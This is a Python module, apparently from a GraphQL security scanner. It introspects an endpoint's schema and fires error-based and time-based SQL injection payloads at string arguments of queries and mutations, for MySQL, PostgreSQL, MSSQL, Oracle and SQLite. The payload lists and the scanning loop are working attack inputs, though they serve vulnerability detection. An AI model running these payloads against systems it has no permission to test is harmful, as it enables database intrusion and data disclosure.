"""
Author: [Your Name]
Version: 1.0
Date: February 2025
Description: Module to test for SQL injection vulnerabilities in GraphQL endpoints.
"""

import aiohttp
from typing import Dict, List, Optional, Tuple
from grapePrint import grapePrint
import json
import time
import asyncio

class wash:
    """
    A class for testing GraphQL endpoints for SQL injection vulnerabilities.
    Supports error-based and time-based detection for multiple database types.
    """

    def __init__(self):
        """Initialize the SQL injection tester with default settings."""
        self.message = grapePrint()
        self.proxy_url: Optional[str] = None
        self.endpoint: Optional[str] = None
        self.headers = {"Content-Type": "application/json"}
        self.schema: Optional[Dict] = None
        self.mutation_fields: Dict[str, Dict] = {}
        self.query_fields: Dict[str, Dict] = {}
        self.timeout_threshold = 5  # Threshold for time-based attacks in seconds

    def configureProxy(self, proxy_host: str, proxy_port: int):
        """Configure HTTP proxy settings."""
        self.proxy_url = f"http://{proxy_host}:{proxy_port}"

    async def runIntrospection(self, session: aiohttp.ClientSession) -> bool:
        """Run introspection query to validate the GraphQL endpoint."""
        query = """
        query {
            __schema {
                queryType {
                    name
                    fields {
                        name
                        args {
                            name
                            type {
                                name
                                kind
                            }
                        }
                    }
                }
                mutationType {
                    name
                    fields {
                        name
                        args {
                            name
                            type {
                                name
                                kind
                            }
                        }
                    }
                }
            }
        }
        """
        try:
            async with session.post(
                self.endpoint,
                json={"query": query},
                headers=self.headers,
                proxy=self.proxy_url,
                ssl=False,
            ) as response:
                if response.status == 200:
                    result = await response.json()
                    if result.get("data", {}).get("__schema"):
                        schema = result["data"]["__schema"]
                        
                        if schema.get("queryType"):
                            for field in schema["queryType"]["fields"]:
                                self.query_fields[field["name"]] = {
                                    "args": field.get("args", [])
                                }

                        if schema.get("mutationType"):
                            for field in schema["mutationType"]["fields"]:
                                self.mutation_fields[field["name"]] = {
                                    "args": field.get("args", [])
                                }
                        
                        return True

                self.message.printMsg(
                    "Introspection failed - endpoint might not be GraphQL",
                    status="error",
                )
                return False

        except Exception as e:
            self.message.printMsg(f"Introspection error: {str(e)}", status="error")
            return False

    def generateSQLInjectionPayloads(self) -> Dict[str, List[str]]:
        """Generate SQL injection test payloads for different database types."""
        return {
            "error_based": [
                # MySQL
                "' OR '1'='1",
                "' UNION SELECT @@version#",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#",
                
                # PostgreSQL
                "' AND 1=CAST((SELECT version()) as INTEGER)--",
                "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) as INTEGER)--",
                "' AND 1=CAST((SELECT current_database()) as INTEGER)--",
                
                # MSSQL
                "' AND 1=CONVERT(int,@@version)--",
                "' AND 1=CONVERT(int,db_name())--",
                "'; IF 1=1 WAITFOR DELAY '00:00:05'--",
                
                # Oracle
                "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--",
                "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||UTL_RAW.CAST_TO_VARCHAR2(DBMS_LOB.SUBSTR((SELECT banner FROM v$version WHERE rownum=1),4000))||CHR(62))) FROM dual)--",
                
                # SQLite
                "' AND 1=CAST((SELECT sqlite_version()) as INTEGER)--",
                "' UNION SELECT sqlite_version()--"
            ],
            "time_based": [
                # MySQL
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#",
                "' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))#",
                
                # PostgreSQL
                "'; SELECT pg_sleep(5)--",
                "'; SELECT CASE WHEN (version()) IS NOT NULL THEN pg_sleep(5) ELSE pg_sleep(0) END--",
                
                # MSSQL
                "'; WAITFOR DELAY '00:00:05'--",
                "'; IF (SELECT COUNT(name) FROM sysobjects) > 0 WAITFOR DELAY '00:00:05'--",
                
                # Oracle
                "' AND 1=(SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual)--",
                
                # SQLite
                "'; WITH RECURSIVE r(n) AS (VALUES(1) UNION ALL SELECT n+1 FROM r WHERE n<100000) SELECT 1 FROM r LIMIT 1--"
            ]
        }

    async def testForSQLInjection(
        self,
        session: aiohttp.ClientSession,
        field_name: str,
        arg_name: str,
        payload: str,
        injection_type: str,
        is_mutation: bool = False
    ) -> Tuple[bool, Optional[str], float]:
        """Test a specific field for SQL injection vulnerabilities."""
        
        operation_type = "mutation" if is_mutation else "query"
        field_info = (
            self.mutation_fields.get(field_name)
            if is_mutation
            else self.query_fields.get(field_name)
        )
        
        if not field_info:
            return False, None, 0.0

        # Build arguments string
        arg_strings = []
        for arg in field_info["args"]:
            if arg["name"] == arg_name:
                arg_strings.append(f'{arg["name"]}: "{payload}"')
            else:
                if arg["type"]["name"] == "Int":
                    arg_strings.append(f'{arg["name"]}: 1')
                elif arg["type"]["name"] == "Boolean":
                    arg_strings.append(f'{arg["name"]}: true')
                else:
                    arg_strings.append(f'{arg["name"]}: "test"')
        args_str = ", ".join(arg_strings)

        # Define response selections based on field type
        field_selections = {
            "User": "{ id username email }",
            "Post": "{ id title content }",
            "Comment": "{ id text }",
            "Default": "{ id message error success }"
        }

        selection = field_selections.get(field_name, field_selections["Default"])
        query = f"""
        {operation_type} {{
            {field_name}({args_str}) {selection}
        }}
        """

        start_time = time.time()
        try:
            timeout = aiohttp.ClientTimeout(total=self.timeout_threshold + 2) if injection_type == "time_based" else aiohttp.ClientTimeout(total=10)
            
            async with session.post(
                self.endpoint,
                json={"query": query},
                headers=self.headers,
                timeout=timeout,
                proxy=self.proxy_url,
                ssl=False,
            ) as response:
                duration = time.time() - start_time
                response_data = await response.json()
                response_text = json.dumps(response_data)

                # Time-based detection
                if injection_type == "time_based" and duration >= self.timeout_threshold:
                    return True, f"Possible time-based SQL injection in {field_name}.{arg_name} (delay: {duration:.2f}s)", duration

                # Error-based detection
                sql_error_patterns = [
                    "SQL syntax",
                    "mysql_fetch",
                    "ORA-",
                    "PostgreSQL",
                    "SQLite3::",
                    "Warning: mysql_",
                    "Warning: pg_",
                    "SQL Server",
                    "SQLSTATE",
                    "Microsoft OLE DB Provider for SQL Server",
                    "ODBC Driver",
                    "Invalid query",
                    "syntax error"
                ]

                for pattern in sql_error_patterns:
                    if pattern.lower() in response_text.lower():
                        return True, f"Possible error-based SQL injection in {field_name}.{arg_name} (matched: {pattern})", duration

                return False, None, duration

        except asyncio.TimeoutError:
            if injection_type == "time_based":
                return True, f"Possible time-based SQL injection in {field_name}.{arg_name} (timeout)", self.timeout_threshold
            return False, None, 0.0
        except Exception as e:
            self.message.printMsg(f"Error testing {field_name}.{arg_name}: {str(e)}", status="error")
            return False, None, 0.0

    async def scanForInjection(self):
        """Scan all fields for SQL injection vulnerabilities."""
        if not self.endpoint or not (self.query_fields or self.mutation_fields):
            self.message.printMsg(
                "No endpoint set or schema not retrieved. Run setEndpoint first.",
                status="error",
            )
            return

        print()
        self.message.printMsg("Starting SQL injection testing", status="success")
        self.message.printMsg(
            "Testing both error-based and time-based payloads...",
            status="warning",
        )

        vulnerabilities = []
        payloads = self.generateSQLInjectionPayloads()

        async with aiohttp.ClientSession() as session:
            # Test query fields
            for field_name, field_info in self.query_fields.items():
                for arg in field_info["args"]:
                    if arg["type"]["name"] in ["String", "ID"]:
                        self.message.printMsg(
                            f"Testing query field: {field_name}.{arg['name']}",
                            status="log",
                        )

                        # Test error-based payloads
                        for payload in payloads["error_based"]:
                            is_vulnerable, message, duration = await self.testForSQLInjection(
                                session, field_name, arg["name"], payload, "error_based"
                            )
                            if is_vulnerable:
                                vulnerabilities.append(message)
                                self.message.printMsg(message, status="failed")

                        # Test time-based payloads
                        for payload in payloads["time_based"]:
                            is_vulnerable, message, duration = await self.testForSQLInjection(
                                session, field_name, arg["name"], payload, "time_based"
                            )
                            if is_vulnerable:
                                vulnerabilities.append(message)
                                self.message.printMsg(message, status="failed")

            # Test mutation fields
            for field_name, field_info in self.mutation_fields.items():
                for arg in field_info["args"]:
                    if arg["type"]["name"] in ["String", "ID"]:
                        self.message.printMsg(
                            f"Testing mutation field: {field_name}.{arg['name']}",
                            status="log",
                        )

                        # Test error-based payloads
                        for payload in payloads["error_based"]:
                            is_vulnerable, message, duration = await self.testForSQLInjection(
                                session, field_name, arg["name"], payload, "error_based", is_mutation=True
                            )
                            if is_vulnerable:
                                vulnerabilities.append(message)
                                self.message.printMsg(message, status="failed")

                        # Test time-based payloads
                        for payload in payloads["time_based"]:
                            is_vulnerable, message, duration = await self.testForSQLInjection(
                                session, field_name, arg["name"], payload, "time_based", is_mutation=True
                            )
                            if is_vulnerable:
                                vulnerabilities.append(message)
                                self.message.printMsg(message, status="failed")

        return vulnerabilities

    async def setEndpoint(self, endpoint: str, proxy: Optional[str] = None) -> bool:
        """Set the endpoint and retrieve its schema through introspection."""
        self.endpoint = endpoint

        if proxy:
            try:
                proxy_host, proxy_port = proxy.split(":")
                self.configureProxy(proxy_host, int(proxy_port))
            except ValueError:
                self.message.printMsg(
                    "Invalid proxy format. Expected host:port", status="error"
                )
                return False

        async with aiohttp.ClientSession() as session:
            return await self.runIntrospection(session)